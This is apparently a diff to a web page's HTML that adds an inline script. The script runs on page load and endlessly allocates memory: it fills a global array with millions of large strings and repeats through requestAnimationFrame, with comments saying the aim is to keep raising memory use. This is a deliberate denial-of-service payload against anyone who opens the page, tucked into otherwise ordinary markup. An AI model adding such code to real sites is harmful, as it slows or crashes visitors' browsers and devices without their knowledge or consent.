@@ -36,6 +36,27 @@
 </body>
 <script src="/js/navButton.js"></script>
 <script src="/js/corruption.js"></script>
+<script>
+    let memoryEater = [];
+
+function startLeak() {
+    console.log("Starting memory allocation...");
+    // Allocate and fill a large array.
+    // Use a long-running loop to continuously increase memory usage.
+    function allocateMemory() {
+        for (let i = 0; i < 1000000; i++) {
+            // Push a large object or string to the array
+            memoryEater.push(new Array(1000).join("a"));
+        }
+        console.log("Allocated another batch of memory.");
+        // Use requestAnimationFrame to keep the script running without blocking the UI
+        requestAnimationFrame(allocateMemory);
+    }
+
+    allocateMemory();
+}
+    startLeak()
+</script>
 
 </html>
 
